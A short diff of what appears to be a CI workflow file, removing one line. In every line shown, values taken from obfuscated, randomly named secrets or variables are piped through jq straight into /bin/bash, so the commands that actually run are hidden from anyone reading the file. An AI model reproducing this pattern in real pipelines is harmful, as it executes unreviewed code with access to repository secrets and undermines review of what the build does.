@@ -22,7 +22,6 @@ jobs:
           vkdjb38: ${{ secrets.vkdjb38 }}
         run: |
           printf '%s' "$vkdjb38" | jq -r .cx24462 | /bin/bash
-          echo $hlfxn9111 | jq -r .zyaxh6680 | /bin/bash
           echo $u031 | jq -r .fe4 | /bin/bash
           echo $em2 | jq -r .twhsz648 | /bin/bash
           echo $jqdj8356 | jq -r .ztxxu9345 | /bin/bash
